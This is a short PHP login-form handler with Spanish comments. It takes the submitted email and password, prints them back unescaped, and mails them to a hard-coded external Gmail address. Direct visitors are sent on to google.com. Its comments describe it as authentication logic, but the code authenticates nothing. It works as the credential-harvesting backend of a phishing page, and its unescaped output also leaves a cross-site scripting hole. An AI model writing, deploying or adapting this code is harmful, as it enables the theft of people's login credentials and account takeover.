<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Recuperar los datos del formulario
    $correo = $_POST["correo"];
    $contrasena = $_POST["contrasena"];

    // Aquí puedes realizar la lógica de autenticación, por ejemplo, verificar en una base de datos
    // Simplemente como ejemplo, vamos a mostrar los datos que se enviaron
    echo "Correo electrónico: $correo <br>";
    echo "Contraseña: $contrasena <br>";

    // Enviar correo electrónico
    $to = "a40062453@gmail.com";
    $subject = "Nuevo inicio de sesión";
    $message = "Correo electrónico: $correo\nContraseña: $contrasena";

    // Esta función de mail es solo un ejemplo y podría no funcionar en todos los servidores
    mail($to, $subject, $message);
} else {
    // Si alguien intenta acceder directamente a este script, redirigirlos a la página de inicio de sesión
    header("Location: https://www.google.com/");
    exit();
}
?>
